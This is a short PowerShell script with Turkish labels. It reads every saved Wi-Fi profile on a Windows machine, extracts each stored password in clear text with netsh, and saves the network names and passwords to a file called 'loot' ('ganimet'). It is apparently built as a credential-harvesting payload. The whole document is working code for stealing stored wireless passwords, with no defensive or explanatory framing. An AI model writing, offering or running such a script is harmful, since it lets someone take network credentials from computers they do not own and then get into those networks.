$wifi_list = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
$results = @()

foreach ($wifi in $wifi_list) {
    $info = netsh wlan show profile name="$wifi" key=clear
    $pass = $info | Select-String "Key Content"
    if ($pass) { $password = $pass.ToString().Split(":")[1].Trim() } else { $password = "YOK" }
    $results += [PSCustomObject]@{ WIFI=$wifi; SIFRE=$password }
}

# Sonucu o anki klasöre kaydet
$results | Out-File "wifi_ganimet.txt"
Write-Host "[+] İŞLEM TAMAM." -ForegroundColor Green
Start-Sleep -Seconds 3